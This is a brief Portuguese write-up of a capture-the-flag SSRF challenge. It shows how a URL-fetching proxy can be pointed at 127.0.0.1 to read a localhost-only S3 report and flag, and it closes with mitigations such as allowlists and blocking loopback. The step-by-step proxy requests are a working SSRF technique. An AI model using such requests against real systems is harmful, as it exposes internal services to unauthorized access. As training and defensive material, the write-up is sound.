# Write-up — M10 SSRF Explorando Endpoint S3

## Visão Geral do Vetor
O proxy simplesmente usa `requests.get` para a URL fornecida. O endpoint `/s3/internal/...` verifica `remote_addr` para garantir que apenas localhost acesse a flag. Quando o proxy realiza a requisição, ele roda no mesmo host e passa na verificação.

## Passo a Passo
1. `GET /api/proxy?url=http://example.com` para verificar funcionamento.
2. `GET /api/proxy?url=http://127.0.0.1:8080/health` para validar SSRF.
3. `GET /api/proxy?url=http://127.0.0.1:8080/s3/internal/statements/report.txt`.
4. Ler a resposta JSON contendo o campo `body` com o relatório e `flag`.

## Evidências
- Logs do endpoint S3 registrando `remote_addr=127.0.0.1` originado pelo proxy.
- Resposta do proxy com `status: 200` e corpo contendo `flag: ITAU2025{...}`.

## Mitigações Recomendadas
- Implementar allowlist de destinos externos legítimos.
- Bloquear resoluções para IPs privados/loopback.
- Não expor endpoints internos sensíveis ou exigir autenticação forte.
